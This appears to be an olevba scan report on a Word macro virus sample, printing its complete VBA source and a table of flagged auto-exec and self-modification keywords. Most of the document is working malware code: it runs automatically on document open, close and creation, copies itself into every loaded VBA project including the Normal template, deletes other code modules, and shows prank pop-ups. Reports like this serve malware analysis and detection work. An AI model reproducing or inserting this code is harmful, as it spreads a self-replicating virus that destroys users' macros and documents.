olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Asis-03f398ad2f4412058902f9c4af3be400fb7c6b2a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Asis-03f398ad2f4412058902f9c4af3be400fb7c6b2a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
On Error Resume Next
Document_Open
End Sub

Private Sub Document_New()
On Error Resume Next
Document_Open
End Sub

Private Sub Document_Open()
On Error Resume Next
    With Options
 '       .SaveNormalPrompt = False
'        .VirusProtection = False
    End With
Dim I%, j%, k As Long, m As Boolean
Application.OnTime When:=Now + TimeValue("00:" & Format(Int(Rnd * 5) + 1, "00") & ":00"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
For I = 1 To VBE.VBProjects.Count
 For j = 1 To VBE.VBProjects(I).VBComponents.Count
  With VBE.VBProjects(I).VBComponents(j).CodeModule
     If .CountOfLines > 80 Or .CountOfLines < 50 Then
     .deletelines 1, .CountOfLines
     Err.Clear
      .AddFromString Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(1, Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfLines)
      If Err = 0 Then
        m = False
        For k = .CountOfLines To .CountOfLines - 20 Step -1
           If .Find("Sub OnTimer", k, 1, k, 30) Then m = True: Exit For
        Next
        If m Then
            .deletelines k
            '.InsertLines k, IIf(VBE.VBProjects(I).Name = "Normal", "Sub OnTimer()", "Private Sub OnTimer1()")
        End If
      Else
      Application.OnTime When:=Now + TimeValue("00:00:10"), Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & ".OnTimer"
      End If
     End If
  End With
 Next
Next
End Sub
Private Sub ShowMess()
On Error Resume Next
If Left(Application.Version, 1) = "8" Then
  ShVer8
Else
 If MsgBox(GetMess(), vbOKCancel, Choose(Int(Rnd * 9) + 1, "Ń 1 Ŕďđĺë˙ Âŕń!", "Îďŕ?-Óăó!", "Ŕ âîň č ńĺăîäí˙říčé ďđčęîë", "Word: Ýňî ˙ áóęâŕëüíî ňîëüęî ÷ňî ďđčäóěŕë", "őĺ-őĺ", "Word: Ýňî ˙ â Đóńńęîě đŕäčî óńëűřŕë", "Đĺęëŕěíŕ˙ ńëóćáŕ Microsoft Word", "Word: Çŕäîëáŕëč ěĺí˙ ýňč ěŕęđîâčđóńű", "Âîň Âŕě," & Application.UserName, "Ďîńëĺäíčé ďđčęîë ńĺçîíŕ", "Word: Îé, ńĺé÷ŕń îďčńŕţńü...")) = 1 Then ShowMess
End If
End Sub
Private Sub ShVer8()
 On Error Resume Next
 Assistant.Visible = True
 Dim bln As Balloon
 Set bln = Assistant.NewBalloon
 With bln
  .Mode = msoModeAutoDown
  .Heading = GetMess()
  .Animation = Int(Rnd * (117))
  .Button = msoButtonSetNextClose
  .Text = Choose(Int(Rnd * 14) + 1, "Ń 1 Ŕďđĺë˙ Âŕń, " & Application.UserName & Space(100) & Assistant.Name, "Îďŕ?-Óăó!", "", "", "óěđó îň ńěĺőŕ", "ďđŕâäŕ ńěĺříî", "Ŕ âîň č ńĺăîäí˙říčé ďđčęîë", Assistant.Name & ": Ýňî ˙ áóęâŕëüíî ňîëüęî ÷ňî ďđčäóěŕë", Assistant.Name & ": Îé, ńĺé÷ŕń îďčńŕţńü...", "őĺ-őĺ", Assistant.Name & ": Ýňî ˙ â Đóńńęîě đŕäčî óńëűřŕë", "Đĺęëŕěíŕ˙ ńëóćáŕ Microsoft Word", Assistant.Name & ": Çŕäîëáŕëč ěĺí˙ ýňč ěŕęđîâčđóńű", "Âîň Âŕě," & Application.UserName, "Ďîńëĺäíčé ďđčęîë ńĺçîíŕ")
  If .Show = -6 Then ShowMess
 End With
 Assistant.Animation = 0
End Sub
Private Function GetMess()
On Error Resume Next
GetMess = Mid(Me.VBProject.VBComponents(Me.CodeName).CodeModule.Lines(Int(Rnd * Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfDeclarationLines) + 1, 1), 2)
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

